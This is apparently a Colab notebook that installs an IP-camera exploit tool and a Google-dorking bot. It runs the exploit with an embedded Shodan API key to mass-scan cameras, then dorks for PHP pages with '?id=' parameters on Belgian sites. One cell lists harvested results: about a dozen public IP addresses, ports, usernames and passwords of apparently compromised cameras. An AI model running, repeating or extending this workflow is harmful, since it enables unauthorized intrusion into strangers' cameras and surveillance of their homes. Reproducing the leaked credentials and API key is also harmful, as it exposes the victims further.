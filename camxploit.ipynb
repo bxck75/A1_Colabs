{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "camxploit.ipynb",
      "provenance": [],
      "private_outputs": true,
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/bxck75/A1_Colabs/blob/master/camxploit.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "2w_jm25sTkVk",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "#@title  { vertical-output: true, output-height: 10 }\n",
        "# remove defaults\n",
        "!rm -r sample_data\n",
        "# Clone the repo\n",
        "!git clone https://github.com/bxck75/Python_Helpers.git\n",
        "\n",
        "# Change dir\n",
        "%cd /content/Python_Helpers\n",
        "# install\n",
        "!python setup.py install\n",
        "\n",
        "from IPython.display import clear_output\n",
        "from PIL import Image\n",
        "import main\n",
        "import os\n",
        "import sys\n",
        "import IPython\n",
        "import Helpers\n",
        "# get pix2pix repo\n",
        "P=Helpers.core.Core()\n",
        "hlp=P.H\n",
        "%cd /content/\n",
        "hlp.repolist= hlp.repo_collection\n",
        "repos_sorted = hlp.repo_collection.repos_sorted\n",
        "A1=['vanpersiexp/expcamera','utiso/dorkbot']\n",
        "hlp.Me(['inst_reps',A1,'/content/installed_repos',False,True])\n",
        "\n",
        "clear_output()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "qgNtGNVrUvP4",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "%cd /content/installed_repos/expcamera\n",
        "pip install -r /content/installed_repos/expcamera/related.txt"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "21rJ9TlRU-qR",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "!python /content/installed_repos/expcamera/exploit_camera.py -h"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "GMoqCxI8U0Gy",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "!python exploit_camera.py -c 1000 -b 1 -v --shodan 74xNGJMs8C0WvP114e3mK1CeJwpHZwce"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2NHqzfwAeOzc",
        "colab_type": "text"
      },
      "source": [
        "[+]The ip:99.240.126.75,port:8081,username:fong9299,password:mickeymouse\n",
        "[+]The ip:78.193.214.248,port:8888,username:linfamily858,password:gilbert888\n",
        "[+]The ip:71.183.210.56,port:9012,username:admin,password:aapl1268\n",
        "[+]The ip:35.137.241.103,port:82,username:admin,password:Jasmine3\n",
        "[+]The ip:8.36.226.161,port:81,username:guest,password:645nelson\n",
        "[+]The ip:200.57.251.91,port:81,username:georgex,password:TUXPAN00\n",
        "[+]The ip:88.186.69.74,port:84,username:admin,password:virago6169\n",
        "[+]The ip:24.198.131.195,port:82,username:admin,password:b0nd3admin\n",
        "[+]The ip:90.48.187.109,port:8086,username:galmerge,password:A1943lme\n",
        "[+]The ip:58.71.208.247,port:95,username:admin,password:21973737\n",
        "[+]The ip:136.34.253.227,port:83,username:admin,password:52351801"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lAd7Y2W0eWHB",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "!sudo apt install phantomjs"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "XHvk-HpheV9Q",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "%cd /content/installed_repos/dorkbot\n",
        "!python /content/installed_repos/dorkbot/setup.py install\n",
        "%cd /content/installed_repos/dorkbot/dorkbot\n",
        "!python dorkbot.py -i google -o engine=010290386800016835992:apngi1s3uou,query=\"filetype:php inurl:?id= site:be\""
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ofQUxco5oNQ2",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "!locate phantom\n",
        "\n"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}